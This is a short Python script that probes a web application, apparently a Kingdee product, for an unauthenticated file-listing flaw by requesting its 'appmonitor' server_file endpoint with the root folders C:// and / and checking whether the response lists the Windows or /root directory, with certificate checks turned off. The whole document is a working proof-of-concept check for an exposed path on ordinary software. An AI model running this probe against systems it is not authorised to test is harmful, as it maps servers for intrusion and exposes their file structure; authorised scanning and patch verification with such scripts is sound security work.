import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"appmonitor/protected/selector/server_file/files?folder=C://&suffix="
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "json" in response.headers["content-type"] and "{\"name\":\"Windows\",\"path\":\"C:\\\\Windows\",\"folder\":true}" in response.text:
				f_list.append(1)
		if len(f_list)==1:
			kingdee1=True
		else:
			kingdee1=False
	else:
		if response.status_code == 200 and "json" in response.headers["content-type"] and "{\"name\":\"Windows\",\"path\":\"C:\\\\Windows\",\"folder\":true}" in response.text:
			kingdee1=True
		else:
			kingdee1=False
	url=baseurl+"appmonitor/protected/selector/server_file/files?folder=/&suffix="
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "json" in response.headers["content-type"] and "{\"name\":\"root\",\"path\":\"/root\",\"folder\":true}" in response.text:
				f_list.append(1)
		if len(f_list)==1:
			kingdee2=True
		else:
			kingdee2=False
	else:
		if response.status_code == 200 and "json" in response.headers["content-type"] and "{\"name\":\"root\",\"path\":\"/root\",\"folder\":true}" in response.text:
			kingdee2=True
		else:
			kingdee2=False
	if kingdee1 or kingdee2:
		return True
	else:
		return False
